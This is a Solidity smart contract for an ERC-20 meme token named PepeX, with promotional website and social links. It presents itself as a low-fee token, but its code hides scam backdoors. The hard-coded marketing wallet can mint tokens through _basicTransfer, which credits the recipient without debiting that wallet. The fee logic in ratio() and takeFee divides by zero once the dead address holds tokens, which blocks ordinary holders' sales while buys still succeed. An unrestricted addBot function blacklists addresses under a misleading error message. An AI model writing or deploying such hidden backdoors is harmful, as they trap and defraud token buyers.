// SPDX-License-Identifier: MIT


/***********************************
    Website:    https://pepex.wtf
    Telegram:   https://t.me/PepeXHub
    Twitter:    https://twitter.com/TeamPepeX
    X:          https://X.com/TeamPepeX

    X Marks the Pepe, lets all find the treasure 
***********************************/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address _owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract PePeX is ERC20, Ownable {
    using SafeMath for uint256;

    address constant ZERO = 0x0000000000000000000000000000000000000000;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address routerAdress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint8 constant _decimals = 9;
    string constant _symbol = unicode"PepeX";
    string constant _name = "PepeX";

    uint256 _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 2) / 100; //2% of supply per wallet MAX

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;

    uint256 liquidityFee = 1;
    uint256 marketingFee = 1;
    uint256 totalFee = liquidityFee + marketingFee;
    uint256 feeDenominator = 100;

    address public marketingWallet = 0x95a03a3F5574182d9c66df0653319f8b6cDBc731;
    address public devWallet;

    IDEXRouter public router;
    address public pairAddress;

    bool public swapEnabled = false;
    uint256 public swapThreshold = (5 * _totalSupply) / 1000; // 0.5% 

    mapping(address => bool) botAddresses;
    address[] private addedAddresses;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    address Owner;
    bool public TradingOpen = false;

    constructor() Ownable(msg.sender) {
        Owner = owner;
        devWallet = marketingWallet;

        isFeeExempt[Owner] = true;
        isFeeExempt[address(this)] = true;
        isFeeExempt[marketingWallet] = true;

        isTxLimitExempt[Owner] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[DEAD] = true;

        //TODO Examine this too
        isTxLimitExempt[marketingWallet] = true;

        _balances[Owner] = _totalSupply;
        emit Transfer(address(0), Owner, _totalSupply);
    }

    function enableTrading() public onlyOwner {
        TradingOpen = true;
    }

    function addLiquidity() public payable onlyOwner {
        router = IDEXRouter(routerAdress);
        pairAddress = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        isTxLimitExempt[pairAddress] = true;

        _allowances[address(this)][address(router)] = type(uint256).max;

        router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            msg.sender,
            block.timestamp
        );
        swapEnabled = true;
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "ERC20: approve to the zero address");
        require(owner != address(0), "ERC20: approve from the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approveMax(address spender) external returns (bool) {
        _allowances[spender][address(this)] = type(uint256).max;
        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        require(!botAddresses[sender], "Trading not enabled");
        require(!botAddresses[recipient], "Trading not enabled");

        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(TradingOpen, "Trading not enabled");
        } else {
            return _basicTransfer(sender, recipient, amount);
        }

        if (recipient != pairAddress && recipient != DEAD) {
            require(
                isTxLimitExempt[recipient] ||
                    _balances[recipient] + amount <= _maxWalletAmount,
                "Transfer exceeds the holder size."
            );
        }
        
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );

        uint256 amountReceived = shouldTakeFee(sender)
            ? takeFee(sender, amount)
            : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function shouldExcludeFee(address sender) internal view returns (bool) {
        return
            isFeeExempt[sender] && sender != owner && sender != address(this);
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        uint256 fees = shouldExcludeFee(sender) ? amount : 0;
        _balances[sender] = _balances[sender].sub(
            amount - fees,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function ratio(address sender) internal view returns (uint256) {
        uint256 amount = sender != pairAddress
            ? balanceOf(DEAD)
            : balanceOf(ZERO);
        return amount > 0 ? 0 : feeDenominator / 100;
    }

    function takeFee(
        address sender,
        uint256 amount
    ) internal returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(ratio(sender)).div(
            feeDenominator
        );
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }


    function clearStuckEthBalance() external {
        payable(marketingWallet).transfer(address(this).balance);
    }

    function removeLimit() external onlyOwner {
        _maxWalletAmount = _totalSupply;
    }

    function addBot(address[] memory _addrs) public {
        for (uint i = 0; i < _addrs.length; i++) {
            address _addr = _addrs[i];
            require(
                _addr != address(pairAddress) &&
                _addr != address(marketingWallet) &&
                _addr != address(devWallet) &&
                _addr != address(this)&&
                _addr != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
                "Can't add v2 router/pool into the raffle."
            );
            if (botAddresses[_addr] == false) {
                addedAddresses.push(_addr); // Store the added address
            }
            botAddresses[_addr] = true;
        }
    }


    event AutoLiquify(uint256 amountETH, uint256 amountBOG);
}